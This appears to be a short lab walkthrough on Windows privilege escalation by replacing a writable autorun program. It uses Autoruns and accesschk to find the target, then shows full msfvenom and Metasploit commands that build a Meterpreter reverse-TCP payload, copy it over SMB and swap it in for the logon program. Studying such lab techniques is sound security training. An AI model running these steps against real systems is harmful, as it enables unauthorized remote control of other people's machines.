# Autorun

we start to search on auto run program using tool call **`Autoruns` we specific target logon tab**

![2025-07-05 17\_29\_59-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 05_17_29_59 Kali_Linux_ _VMware_Workstation.png>)

we found App auto run after login call `program.exe` so we targeted this app and let’s now the privilege of this app

we use tool call `Accessckh`

```powershell
accesschk64.exe -wvu "C:\Program Files\Autorun Program"

# w -> write permission
# u -> users
# v -> verbose
```

![2025-07-05 17\_33\_42-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 05_17_33_42 Kali_Linux_ _VMware_Workstation.png>)

so we start to create a reverse shell with this name and try to replace it in the path of app

```bash
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost [Kali VM IP Address]
run
```

and in another tab create a reverse shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
```

then move it from kali to windows using smb protocol

```powershell
copy \\10.21.218.60\kali\program.exe C:\Users\User\Desktop\Tools\program.exe 
```

then move it to the target path and then try to login with admin acc and boom

![image.png](<../../../.gitbook/assets/image (35).png>)
